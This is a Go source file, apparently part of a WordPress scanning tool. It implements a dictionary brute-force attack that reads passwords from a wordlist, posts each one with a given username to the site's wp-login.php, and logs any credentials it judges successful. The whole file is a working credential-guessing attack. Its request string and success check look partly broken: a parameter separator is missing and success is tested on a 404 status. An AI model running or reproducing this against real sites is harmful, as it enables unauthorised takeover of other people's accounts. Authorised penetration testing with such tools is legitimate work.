package bruteforce

import (
	"bufio"
	"os"
	"regexp"

	"github.com/institute-atri/glogger"
	"github.com/institute-atri/gnet"
)

// This function will perform a brute force attack on the WordPress site, providing the link and user
func Bruteforce(url, user string) {
	glogger.Warning("Doing brute force attack...")
	wordlistFile := "./tools/bruteforce/wordlist.txt"
	urlLogin := url + "/wp-login.php"

	file, err := os.Open(wordlistFile)

	if err != nil {
		glogger.Danger("Error opening file:", err)
		return
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)
	tryingPasswords(scanner, urlLogin, user)

	if err := scanner.Err(); err != nil {
		glogger.Danger("Error reading file:", err)
		return
	}
}

func tryingPasswords(scanner *bufio.Scanner, url, user string) {
	for scanner.Scan() {
		word := scanner.Text()
		response := gnet.POST(url, "log="+user+"&pwd="+word+"&wp-submit=Acessar&redirect_to="+url+"testcookie=1")

		if response.StatusCode == 404 {
			read := regexp.MustCompile(`<meta name="generator" content="WordPress [\d.]+?" />`)

			matches := read.FindAllString(string(response.BRaw), -1)

			for _, match := range matches {
				if match != "" {
					glogger.Done("login:\n username:" + user + "\n password:" + word)
				}
			}

			break
		}
	}
}
